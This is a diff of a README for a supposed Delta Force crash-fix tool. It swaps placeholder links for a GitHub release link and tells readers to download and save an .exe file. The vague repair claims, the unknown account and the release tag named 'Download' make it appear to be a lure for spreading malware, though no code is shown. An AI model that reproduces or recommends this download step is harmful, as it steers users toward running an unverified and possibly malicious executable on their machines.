@@ -1,6 +1,6 @@
 # 🛠️ Delta-Force-Crash-Fix - Fix Game Crashes On Your PC
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](//////////////////)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Malidrena88/-Delta-Force-Crash-Fix-2026/releases/tag/Download)
 
 This software corrects errors that cause Delta Force to close unexpectedly on Windows 10 and Windows 11. It restores missing system dependencies and adjusts configuration files to ensure the game starts and runs properly.
 
@@ -17,7 +17,7 @@ Your computer must meet these requirements to run the repair tool:
 
 Follow these steps to obtain the repair tool:
 
-1. Visit the [official release page](////////////).
+1. Visit the [official release page](https://github.com/Malidrena88/-Delta-Force-Crash-Fix-2026/releases/tag/Download).
 2. Locate the most recent version under the "Assets" section.
 3. Select the file ending in .exe to start your download.
 4. Save the file to your desktop for easy access.
